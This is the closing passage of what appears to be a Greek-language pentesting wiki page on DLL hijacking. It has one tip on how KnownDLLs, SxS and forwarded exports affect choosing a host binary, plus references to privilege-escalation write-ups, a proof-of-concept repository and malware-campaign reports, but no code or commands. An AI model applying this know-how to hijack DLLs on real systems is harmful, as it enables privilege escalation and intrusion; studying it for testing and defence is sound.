- KnownDLLs, SxS και forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να ληφθούν υπόψη κατά την επιλογή του host binary και του export set.

## Αναφορές

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
